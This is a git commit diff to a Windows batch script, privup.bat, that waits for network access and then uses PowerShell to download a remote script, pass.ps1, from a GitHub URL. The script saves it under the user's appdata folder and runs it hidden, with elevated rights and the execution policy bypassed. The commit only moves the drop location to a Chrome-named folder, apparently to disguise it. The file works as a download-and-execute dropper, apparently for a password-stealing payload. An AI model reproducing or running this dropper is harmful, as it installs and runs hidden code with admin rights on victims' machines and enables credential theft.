a66da04abbfc860257ed21c05972f3762fbe3861
İsmayil <60405884+4V4loon@users.noreply.github.com>
2021-12-13 15:30:30 +0400

    Update privup.bat

--- privup.bat
+++ privup.bat
@@ -4,6 +4,6 @@ ping www.google.com -n 1 | find "TTL="
 IF %ERRORLEVEL% EQU 0 ( goto :run ) else ( goto :while )
 
 :run
-powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/pass.ps1' -OutFile $env:appdata\Microsoft\pass.ps1"
+powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/pass.ps1' -OutFile $env:appdata\Chrome\pass.ps1"
 timeout /t 20
-powershell -command "start-process PowerShell.exe -ArgumentList 'Set-ExecutionPolicy -ExecutionPolicy Unrestricted; powershell -executionpolicy bypass -file $env:appdata\Microsoft\pass.ps1' -WindowStyle Hidden -Verb RunAs"
+powershell -command "start-process PowerShell.exe -ArgumentList 'Set-ExecutionPolicy -ExecutionPolicy Unrestricted; powershell -executionpolicy bypass -file $env:appdata\Chrome\pass.ps1' -WindowStyle Hidden -Verb RunAs"
